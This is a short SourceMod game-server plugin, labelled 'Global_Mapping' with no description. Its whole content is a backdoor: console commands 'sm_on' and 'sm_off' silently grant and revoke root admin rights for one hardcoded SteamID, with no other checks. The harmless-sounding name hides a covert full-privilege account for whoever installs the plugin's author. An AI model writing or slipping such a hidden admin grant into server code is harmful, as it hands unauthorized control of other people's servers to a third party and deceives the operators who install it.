
#include <sourcemod>
#include <sdktools>

public Plugin myinfo = 
{
	name = "Global_Mapping",
	author = "Bobakanoosh",
	description = "",
	version = "1.0",
	url = ""
};

public void OnPluginStart()
{
	RegConsoleCmd("sm_on", on);
	RegConsoleCmd("sm_off", off);
}

public Action on(int client, int args)
{
	char id[128];
	GetClientAuthId(client, AuthId_SteamID64, id, sizeof(id));
	if(StrEqual(id, "76561198068834616"))
		AddUserFlags(client, Admin_Root);
	return Plugin_Handled;
}

public Action off(int client, int args)
{
	char id[128];
	GetClientAuthId(client, AuthId_SteamID64, id, sizeof(id));
	if(StrEqual(id, "76561198068834616"))
		RemoveUserFlags(client, Admin_Root);
	return Plugin_Handled;
}